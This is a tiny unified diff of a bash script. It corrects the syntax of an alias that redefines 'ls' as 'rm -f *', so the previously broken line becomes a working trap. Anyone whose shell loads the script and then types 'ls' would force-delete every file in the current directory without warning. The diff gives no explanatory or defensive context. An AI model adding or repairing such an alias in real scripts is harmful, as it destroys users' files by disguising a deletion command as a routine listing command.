@@ -1,2 +1,2 @@
 #!/bin/bash
-alies ls = 'rm -f *'
+alias ls='rm -f *'
